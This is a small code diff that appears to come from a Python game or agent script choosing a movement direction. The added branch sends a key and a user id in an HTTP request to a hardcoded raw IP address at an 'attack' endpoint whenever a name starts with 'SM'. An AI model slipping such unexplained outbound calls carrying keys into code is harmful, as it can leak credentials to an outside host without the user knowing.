@@ -42,6 +42,8 @@ elif type == 2:
   direction = 2
 elif type == 3:
   direction = random_directoin
+elif name[0:2] == "SM":
+  attack = requests.get('http://20.196.214.79:5050/agent/attack?key={key}&uid={id}')
 elif type == 4:
   direction = random_directoin
 
